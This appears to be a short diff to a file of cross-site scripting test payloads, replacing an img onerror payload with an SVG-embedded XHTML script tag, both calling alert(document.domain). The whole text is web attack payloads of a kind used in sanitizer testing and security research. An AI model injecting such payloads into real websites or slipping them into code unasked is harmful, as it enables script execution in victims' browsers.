@@ -1,3 +1,4 @@
 <svg>
+<script xmlns="http://www.w3.org/1999/xhtml">alert(document.domain)</script>
 </svg>
-<img src=x onerror=alert(document.domain)>
+<script xmlns="http://www.w3.org/1999/xhtml">alert(document.domain)</script>
